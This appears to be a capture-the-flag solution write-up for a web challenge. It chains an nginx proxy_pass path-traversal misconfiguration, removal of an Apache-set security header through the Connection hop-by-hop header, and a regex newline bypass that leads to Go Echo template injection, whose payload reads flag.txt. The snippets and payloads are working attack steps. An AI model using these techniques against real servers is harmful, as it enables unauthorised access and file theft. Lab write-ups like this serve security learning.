# solution

nginx off by one slash misconfig via proxy_pass which you can abuse to access unacessable endpoints on backend
```nginx
        location /vaults {
            proxy_pass http://apache-proxy/vaults/;
        }
```

send request: 
/vaults../controlPanel == /vaults/../controlPanel
 to access the control panel endpoint via apache on go backend

Then you need to pass the additional security header check
`if _, exists := c.Request().Header["X-Is-Remote"]; !exists {`

To bypass this check you need to abuse RFC hop by hop headers, which will strip the header in the apache proxy, headers are set in apache:
    Header set X-Is-Remote "True"
    RequestHeader set X-Is-Remote "True"

In request:
```http
HTTP ....
...
Connection: closed, X-Is-Remote
```

this will strip the X-Is-Remote req

Next step when you get access to controlPanel is to bypass the regex check for the tags and get ssti in which you will use golang Echo Web Framework as a gadget since it has a file read method by default ({{ .File "flag.txt"}})

To bypass regex:
```Go
if newVault.Tag != "" && newVault.Tag != "NaN" {
            re := regexp.MustCompile(`^(public|gold|lucky|cursed|secret|jewlery)(\n.*)?$`)
            if !re.MatchString(newVault.Tag) {
                return c.JSON(http.StatusBadRequest, map[string]string{
                    "error": "You can only use whitelisted tags",
                })
            }
```

you just need to add newline after the valid tag, so:
`public%0A{{ .File "flag.txt"}}`